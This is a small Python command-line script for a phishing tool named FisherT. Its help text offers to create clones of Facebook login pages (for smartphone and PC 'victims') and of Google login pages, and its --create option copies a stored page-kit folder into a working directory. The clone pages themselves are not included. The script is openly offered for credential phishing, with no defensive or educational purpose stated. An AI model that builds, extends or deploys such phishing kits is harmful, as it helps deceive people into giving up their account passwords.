import sys
from distutils.dir_util import copy_tree

a = sys.argv[1]
VERSION = '1.0.0'
HELP = '''
 _____ ________  _____             ______  ______  ________
|         |     |        |      | |       |      |    |
|         |     |        |      | |       |_____ |    |
|_____    |     |_____   |______| |_____  |    \      |
|         |           |  |      | |       |     \     |
|      ___|____  _____|  |      | |______ |      \    |

               VERSION 1.0.0

FisherT is a socila engeenering tool which can be used to make
phishing page clones of some of the widely used medias.
Type the following command to create a clone:
\n\t\tfishert --create <FLAG> <folder name to give>\n
You can know the supported FLAGS by typing the following command:
\n\t\tfishert --flags
 '''
PAYLOADS = '''\nFlag\t\t\t\t\tDescription\nfacebook-small\t\t\tFacebook login clone page for smartphone victim.
facebook-big\t\t\tFacebook login clone page for PC victim.
google\t\t\t\tGoogle login clone page.
'''

if(a == "--version"):
    print(VERSION)
elif(a  == "--help"):
    print(HELP)
elif(a  == "--flags"):
    print(PAYLOADS)
elif(a  == "--create"):
    b = "assets/"+sys.argv[2]
    copy_tree(b, "/fishert-files/"+sys.argv[3])
